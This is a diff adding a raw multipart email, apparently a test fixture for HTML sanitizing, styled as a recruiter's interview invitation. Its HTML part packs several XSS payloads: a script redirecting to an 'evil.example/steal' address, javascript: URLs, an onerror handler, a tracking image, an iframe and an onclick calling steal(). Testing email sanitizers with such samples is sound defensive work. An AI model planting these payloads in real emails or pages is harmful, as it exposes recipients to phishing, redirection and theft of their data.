@@ -1,0 +1,28 @@
+Message-ID: <xss-0001@evil.example>
+From: Recruiter <hr@corp.example>
+To: harshith.manne@pilotmail.co
+Subject: You have an interview
+Date: Tue, 21 Jul 2026 11:00:00 +0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============5927396860297297570=="
+
+--===============5927396860297297570==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+plain text fallback body
+
+--===============5927396860297297570==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><script>alert('pwned');document.location=3D'http://evil.example/s=
+teal'</script><style>body{background:url(javascript:alert(1))}</style><img sr=
+c=3D"http://evil.example/track.png" onerror=3D"alert('xss')"><a href=3D"javas=
+cript:alert(2)">click</a><iframe src=3D"http://evil.example/frame"></iframe><=
+p onclick=3D"steal()">Congratulations, you have an interview at Corp.</p></bo=
+dy></html>
+
+--===============5927396860297297570==--
